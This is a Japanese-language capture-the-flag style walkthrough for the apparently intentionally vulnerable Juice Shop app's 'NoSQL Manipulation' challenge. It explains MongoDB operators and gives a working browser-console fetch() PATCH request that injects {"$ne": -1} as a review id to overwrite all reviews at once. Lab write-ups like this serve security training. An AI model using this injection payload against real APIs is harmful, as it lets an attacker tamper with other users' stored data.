# NoSQL Manipulation ✅

**難易度:** ⭐⭐⭐⭐
**カテゴリ:** NoSQLi
**目標:** 全てのレビューを一括で変更する

---

## 思考プロセス

**ステップ1: レビュー機能を分析**
```
「商品レビューを更新できるAPIがある」
    ↓
「PATCH /rest/products/reviews でレビューを編集」
    ↓
「普通は自分のレビュー（特定ID）だけ更新できるはず」
    ↓
「IDの指定方法を悪用できないか？」
```

**ステップ2: MongoDBの演算子を理解**
```
「Juice ShopはMongoDBを使っている（レビュー部分）」
    ↓
「MongoDBには特殊な演算子がある」
    ↓
「$ne = not equal（～でない）」
    ↓
「$gt = greater than（～より大きい）」
```

**ステップ3: 攻撃ペイロードを構築**
```
「id: {"$ne": -1} を送信してみる」
    ↓
「意味: IDが -1 でない全てのレビュー」
    ↓
「-1 のIDは存在しないから、実質全レビュー」
```

## 実行手順

1. ログインする
2. Console で以下を実行:
   ```javascript
   fetch('/rest/products/reviews', {
     method: 'PATCH',
     headers: {
       'Content-Type': 'application/json',
       'Authorization': 'Bearer ' + localStorage.getItem('token')
     },
     body: JSON.stringify({
       id: {"$ne": -1},
       message: "All reviews hacked!"
     })
   }).then(r => r.json()).then(console.log)
   ```
3. 全てのレビューが変更される

## 解説

**NoSQLインジェクションとは？**
- MongoDBなどのNoSQLデータベースへの攻撃
- `$ne`（not equal）などの演算子を悪用する
- `{"$ne": -1}` は「IDが-1でない全て」を意味する

## 関連チャレンジ

- [NoSQL Exfiltration](../difficulty-5-6/nosql-exfiltration.md)
- [Login Admin](../difficulty-2/login-admin.md)
